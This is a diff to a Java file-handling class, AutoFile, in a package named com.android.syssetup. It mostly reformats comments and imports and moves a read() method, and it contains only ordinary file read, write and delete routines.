@@ -9,6 +9,13 @@
 
 package com.android.syssetup.file;
 
+import com.android.syssetup.Status;
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.util.ByteArray;
+import com.android.syssetup.util.Check;
+import com.android.syssetup.util.Execute;
+import com.android.syssetup.util.ExecuteResult;
+
 import java.io.BufferedInputStream;
 import java.io.BufferedOutputStream;
 import java.io.BufferedReader;
@@ -21,19 +28,14 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.util.Date;
 
-import com.android.syssetup.Status;
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.util.ByteArray;
-import com.android.syssetup.util.Check;
-import com.android.syssetup.util.Execute;
-import com.android.syssetup.util.ExecuteResult;
-
 /**
  * The Class AutoFlashFile.
  */
 public final class AutoFile {
 
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "AutoFile"; //$NON-NLS-1$
 	private File file;
 	private String filename;
@@ -42,9 +44,8 @@ public final class AutoFile {
 	 * Instantiates a new auto flash file.
 	 * http://developer.android.com/guide/topics
 	 * /data/data-storage.html#filesInternal
-	 * 
-	 * @param filename
-	 *            the filename
+	 *
+	 * @param filename the filename
 	 */
 	public AutoFile(final String filename) {
 		file = new File(filename);
@@ -60,16 +61,6 @@ public final class AutoFile {
 		this(filesDir.getAbsolutePath(), file);
 	}
 
-
-
-	/**
-	 * Reads the content of the file.
-	 * 
-	 * @return the byte[]
-	 */
-	public byte[] read() {
-		return read(0);
-	}
 	/**
 	 * Reads the content of the file, without checking the file size
 	 * this is useful for virtual files like those in /proc/
@@ -87,7 +78,7 @@ public final class AutoFile {
 			BufferedReader input = new BufferedReader(new FileReader(new File(path)));
 			try {
 				String line = null; //not declared within while loop
-        /*
+	    /*
                  * readLine is a bit quirky : it returns the content of a line
                  * MINUS the newline. it returns null only for the END of the
                  * stream. it returns an empty String if two newlines appear in
@@ -112,11 +103,20 @@ public final class AutoFile {
 
 		return contents.toString();
 	}
+
+	/**
+	 * Reads the content of the file.
+	 *
+	 * @return the byte[]
+	 */
+	public byte[] read() {
+		return read(0);
+	}
+
 	/**
 	 * Read the file starting from the offset specified.
-	 * 
-	 * @param offset
-	 *            the offset
+	 *
+	 * @param offset the offset
 	 * @return the byte[]
 	 */
 	public byte[] read(final int offset, int length) {
@@ -165,9 +165,8 @@ public final class AutoFile {
 
 	/**
 	 * Read the file starting from the offset specified.
-	 * 
-	 * @param offset
-	 *            the offset
+	 *
+	 * @param offset the offset
 	 * @return the byte[]
 	 */
 	public byte[] read(final int offset) {
@@ -216,9 +215,8 @@ public final class AutoFile {
 
 	/**
 	 * Write some data to the file.
-	 * 
-	 * @param data
-	 *            the data
+	 *
+	 * @param data the data
 	 */
 	public void write(final byte[] data) {
 		write(data, 0, false);
@@ -227,13 +225,10 @@ public final class AutoFile {
 	/**
 	 * Write a data buffer in the file, at a specific offset. If append is false
 	 * the content of the file is overwritten.
-	 * 
-	 * @param data
-	 *            the data
-	 * @param offset
-	 *            the offset
-	 * @param append
-	 *            the append
+	 *
+	 * @param data   the data
+	 * @param offset the offset
+	 * @param append the append
 	 * @return true, if successful
 	 */
 	public synchronized boolean write(final byte[] data, final int offset, final boolean append) {
@@ -272,9 +267,8 @@ public final class AutoFile {
 
 	/**
 	 * Append some data to the file.
-	 * 
-	 * @param data
-	 *            the data
+	 *
+	 * @param data the data
 	 */
 	public synchronized boolean append(final byte[] data) {
 		if (data == null) {
@@ -327,7 +321,7 @@ public final class AutoFile {
 
 	/**
 	 * Tells if the file exists.
-	 * 
+	 *
 	 * @return true, if successful
 	 */
 	public boolean exists() {
@@ -336,7 +330,7 @@ public final class AutoFile {
 
 	/**
 	 * The file can be read.
-	 * 
+	 *
 	 * @return true if readable
 	 */
 	public boolean canRead() {
@@ -345,7 +339,7 @@ public final class AutoFile {
 
 	/**
 	 * Check. if the file is a directory. //$NON-NLS-1$
-	 * 
+	 *
 	 * @return true, if is directory
 	 */
 	public boolean isDirectory() {
@@ -354,7 +348,7 @@ public final class AutoFile {
 
 	/**
 	 * List the content of the directory.
-	 * 
+	 *
 	 * @return the string[]
 	 */
 	public String[] list() {
@@ -366,7 +360,7 @@ public final class AutoFile {
 
 	/**
 	 * Gets the size of the file.
-	 * 
+	 *
 	 * @return the size
 	 */
 	public long getSize() {
@@ -375,7 +369,7 @@ public final class AutoFile {
 
 	/**
 	 * Gets the file time.
-	 * 
+	 *
 	 * @return the file time
 	 */
 	public Date getFileTime() {
@@ -396,7 +390,7 @@ public final class AutoFile {
 	public boolean delete() {
 		if (file.exists()) {
 			file.delete();
-			if(Cfg.DEBUG) {
+			if (Cfg.DEBUG) {
 				Check.ensures(!file.exists(), "File should be deleted");
 			}
 			return true;
@@ -419,7 +413,7 @@ public final class AutoFile {
 	}
 
 	public void create() {
-		write(new byte[] { 0 });
+		write(new byte[]{0});
 		if (Cfg.DEBUG) {
 			Check.ensures(file.exists(), "Non existing file"); //$NON-NLS-1$
 		}
@@ -480,7 +474,9 @@ public final class AutoFile {
 		}
 	}
 
-	/** The file. */
+	/**
+	 * The file.
+	 */
 	public File getFile() {
 		return file;
 	}
